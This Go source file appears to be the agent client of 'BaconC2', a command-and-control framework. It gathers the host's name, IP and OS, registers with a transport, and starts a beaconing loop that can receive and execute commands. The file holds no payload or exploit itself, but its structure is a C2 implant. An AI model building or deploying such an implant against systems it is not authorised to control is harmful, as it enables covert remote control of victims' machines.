package agent

import (
	"github.com/RabbITCybErSeC/BaconC2/client/config"
	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
	"github.com/RabbITCybErSeC/BaconC2/pkg/commands/handlers/system"
	"github.com/RabbITCybErSeC/BaconC2/pkg/logging"
	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
)

type AgentClient struct {
	config          *config.AgentConfig
	transport       transport.ITransportProtocol
	commandExecutor models.ICommandExecutor
	resultsQueue    queue.IResultQueue
	agent           models.Agent
	isRunning       bool
}

func NewAgentClient(cfg *config.AgentConfig, tr transport.ITransportProtocol, commandExecutor models.ICommandExecutor, commandQueue queue.ICommandQueue, resultsQueue queue.IResultQueue) *AgentClient {
	return &AgentClient{
		config:          cfg,
		transport:       tr,
		commandExecutor: commandExecutor,
		resultsQueue:    resultsQueue,
	}
}

func (c *AgentClient) Initialize() error {

	sysInfo, err := system.GatherMinimalInfo(c.config.Protocol)

	if err != nil {
		logging.Warn("Failed to gather minimal system info: %v", err)
	}

	c.agent = models.Agent{
		ID:       c.config.AgentID,
		Hostname: sysInfo.Hostname,
		IP:       sysInfo.IP,
		OS:       sysInfo.OS,
		Protocol: sysInfo.Protocol,
	}

	if err := c.transport.Initialize(c.agent); err != nil {
		return err
	}

	return nil
}

func (c *AgentClient) Start() error {
	if c.isRunning {
		return nil
	}

	c.isRunning = true
	logging.Debug("Agent %s started, beaconing every %s", c.agent.ID, c.config.BeaconInterval)
	go c.transport.Start()

	return nil
}

func (c *AgentClient) Stop() {
	if !c.isRunning {
		return
	}

	c.isRunning = false

	if err := c.transport.Stop(); err != nil {
		logging.Debug("Error closing transport: %v", err)
	}
}

func getOutboundIP() string {
	return "127.0.0.1"
}
